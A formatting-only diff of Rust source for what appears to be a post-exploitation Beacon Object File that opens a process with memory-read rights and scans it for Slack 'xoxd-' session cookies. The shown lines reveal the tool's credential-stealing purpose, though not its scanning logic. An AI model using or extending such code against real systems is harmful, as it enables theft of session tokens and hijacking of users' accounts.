@@ -14,7 +14,7 @@
 use alloc::vec;
 use rustbof::data::DataParser;
 use rustbof::{eprintln, println};
-use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, FALSE};
+use windows_sys::Win32::Foundation::{CloseHandle, FALSE, GetLastError};
 use windows_sys::Win32::System::Threading::{
     OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
 };
@@ -95,11 +95,12 @@ fn main(args: *mut u8, len: usize) {
         return;
     }
 
-    println!("slack_cookie: Scanning process {} for Slack auth cookies (xoxd- prefix)", pid);
+    println!(
+        "slack_cookie: Scanning process {} for Slack auth cookies (xoxd- prefix)",
+        pid
+    );
 
-    let process = unsafe {
-        OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid)
-    };
+    let process = unsafe { OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid) };
     if process.is_null() {
         let err = unsafe { GetLastError() };
         eprintln!("Failed to open process {} (error {:#X})", pid, err);
@@ -159,7 +160,10 @@ fn main(args: *mut u8, len: usize) {
 
     unsafe { CloseHandle(process) };
 
-    println!("Scanned {} regions, found {} Slack cookie(s)", regions_scanned, total_found);
+    println!(
+        "Scanned {} regions, found {} Slack cookie(s)",
+        regions_scanned, total_found
+    );
     if total_found > 0 {
         println!("SUCCESS.");
     } else {
